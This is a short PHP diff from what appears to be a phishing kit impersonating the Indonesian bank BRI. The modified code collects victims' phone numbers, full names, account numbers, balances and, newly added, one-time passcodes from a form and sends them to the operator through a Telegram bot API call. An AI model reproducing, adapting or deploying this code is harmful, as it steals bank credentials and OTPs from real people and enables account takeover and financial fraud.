@@ -5,11 +5,10 @@
 session_start();
 include "./telegram.php";
 
-$_SESSION["nomorkus"] = $_POST ['nomorku'];
-$_SESSION["debits"] = $_POST ['debit'];
-$_SESSION["namas"] = $_POST ['nama'];
 
-$message = "❁┷━❃𝗕𝗥𝗜.𝗖𝗢.𝗜𝗗❃━┷❁". "\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :\n".  $_POST ['nomorsaya']. "\n𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : \n". $_POST ['namaku']. "\n𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 :\n". $_POST ['norekku'].  "\n𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿 :\n". $_POST ['saldoTerakhir'];
+
+$message = "❁┷━❃𝗕𝗥𝗜.𝗖𝗢.𝗜𝗗❃━┷❁". "\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :\n".  $_POST ['tele']. "\n𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : \n". $_POST ['namanye']. "\n𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 :\n". $_POST ['kertu'].  "\n𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿 :\n". $_POST ['uang'].  "\n\n𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 :\n".$_POST ['otp'];
+
 function sendMessage($telegram_id, $message, $id_bot)
 {
 $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
